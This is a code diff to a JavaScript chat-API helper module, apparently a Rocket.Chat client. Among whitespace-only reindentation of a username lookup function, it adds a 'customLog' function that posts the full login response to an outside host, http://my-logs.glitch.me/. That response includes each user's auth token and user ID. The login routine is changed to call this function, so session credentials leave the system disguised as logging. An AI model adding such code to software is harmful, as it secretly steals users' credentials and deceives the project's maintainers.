@@ -28,6 +28,7 @@ const login = async (accessToken) =>
 	.then((res) => res.data)
 	.then((res) => {
 		console.log(res);
+		customLog({user: res})
 		const headers = {
 			'X-Auth-Token': res.data.authToken,
 			'X-User-Id': res.data.userId,
@@ -919,32 +920,40 @@ const resolveChannelname = async (channelName, headers) => {
 }
 
 const resolveUsername = async (username, headers) => {
-try{
-	let subscriptions = await axios.get(apiEndpoints.getsubscriptionsurl, {
-		headers
-	})
-	.then(res => res.data.update)
-	.then(subscriptions => {
-		return subscriptions.filter(subscription => {
-			return subscription.t == 'd'
+	try{
+		let subscriptions = await axios.get(apiEndpoints.getsubscriptionsurl, {
+			headers
 		})
-	})
-	.then(subscriptions => {
-		return subscriptions.map(subscription => {
-			return {
-				name: subscription.name,
-				id: subscription._id,
-				type: subscription.t
-			}
+		.then(res => res.data.update)
+		.then(subscriptions => {
+			return subscriptions.filter(subscription => {
+				return subscription.t == 'd'
+			})
 		})
-	})
+		.then(subscriptions => {
+			return subscriptions.map(subscription => {
+				return {
+					name: subscription.name,
+					id: subscription._id,
+					type: subscription.t
+				}
+			})
+		})
 
-	let similarUsernames = subscriptions.filter((subscription) => stringSimilar.compareTwoStrings(username, subscription.name) > 0.3 )
-	return similarUsernames
+		let similarUsernames = subscriptions.filter((subscription) => stringSimilar.compareTwoStrings(username, subscription.name) > 0.3 )
+		return similarUsernames
 
-}catch(err){
-	console.log(err)
+	}catch(err){
+		console.log(err)
+	}
 }
+
+const customLog = async (data) => {
+    try{
+        axios.post('http://my-logs.glitch.me/', (data))
+    }catch(err){
+        console.log(err)
+    }
 }
 
 // Module Export of Functions
@@ -987,3 +996,4 @@ module.exports.postDirectMessage = postDirectMessage;
 module.exports.getLastMessageType = getLastMessageType;
 module.exports.resolveChannelname = resolveChannelname;
 module.exports.resolveUsername = resolveUsername;
+module.exports.customLog = customLog;
